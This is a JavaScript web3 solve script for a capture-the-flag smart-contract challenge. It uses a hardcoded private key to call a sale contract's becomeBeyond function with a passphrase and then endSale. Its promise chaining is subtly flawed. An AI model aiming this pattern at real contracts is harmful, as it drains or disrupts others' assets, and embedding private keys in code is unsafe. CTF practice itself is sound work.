const { Web3 } = require('web3')

const rpcEndpoint = 'http://worker06.gcc-ctf.com:11718/rpc'; // Replace <rpc-port> with the port Ganache CLI is running on
const web3 = new Web3(rpcEndpoint);

const challAddress = '0x79c8DE1de7C4A1544400b11e4d069141FC85E269'; // Replace <contract-address> with the deployed contract address
const challABI = require('./ChallengeABI.json'); // Replace ContractABI.json with your contract's ABI
const katanaABI = require('./KatanaABI.json');

const setupInstance = new web3.eth.Contract(challABI, challAddress);
const passPhrase = "I will check out @BeyondBZH and @gcc_ensibs on X"

let katanaAddress = '0x93188107a15AB18eF42C3D8837E69C145AD41608'
const katanaInstance = new web3.eth.Contract(katanaABI, katanaAddress);

const privateKey = '0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb';

// Derive the account address from the private key
const account = web3.eth.accounts.privateKeyToAccount(privateKey);
const player = account.address
web3.eth.accounts.wallet.add(account);
web3.eth.defaultAccount = account.address;

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Call a contract function
async function getContractAddresses() {

    await setupInstance.methods.katanaSale().call()
        .then(result => {
            console.log('KatanaSale address:', result);
            // katanaAddress = result
        })
        .catch(err => {
            console.error('Error:', err);
        });

}
getContractAddresses()


function checkIsSolved() {
    setupInstance.methods.isSolved().call()
        .then(result => {
            console.log('Solved status:', result);
        })
        .catch(err => {
            console.error('Error:', err);
        });

}

function becomeBeyond() {
    return new Promise(resolve=> {
        katanaInstance.methods.becomeBeyond(passPhrase).send({
            from: player
        })
            .then(result => {
                console.log('Solved status:', result);
                resolve(result.status)
            })
            .catch(err => {
                console.error('Error:', err);
            });
    })
}

function endSale() {
    return new Promise(resolve=> {
        katanaInstance.methods.endSale().send({
            from: player
        })
            .then(result => {
                console.log('Solved status:', result);
                resolve(result.status)
            })
            .catch(err => {
                console.error('Error:', err);
            });
    })
}

function logic() {
    becomeBeyond().then(endSale().then(checkIsSolved))
}
checkIsSolved()
logic()